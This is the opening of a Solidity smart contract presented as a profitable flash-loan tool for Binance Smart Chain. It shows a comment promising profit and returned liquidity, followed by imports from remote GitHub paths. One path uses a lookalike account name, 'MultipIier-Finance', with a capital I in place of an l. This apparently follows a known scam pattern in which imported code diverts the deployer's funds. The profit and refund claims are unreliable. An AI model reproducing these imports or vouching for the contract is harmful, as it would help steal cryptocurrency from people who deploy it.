pragma solidity ^0.5.0;

/**
 * WARNING - this contract code is ONLY for Binance Smart Chain.
 * Testnet transactions will fail.
 * Profit remaining will be transfered to token creator contract.

 *UPDATED 02/08/2022 - liquidity returned if flash loan fails or insufficient balance ~ wait time around 5-24 hours
*/

// Multiplier-Finance Smart Contracts
import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/MultipIier-Finance/MCL-FlashloanDemo/blob/main/PoolAddressesProvider.sol";


// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
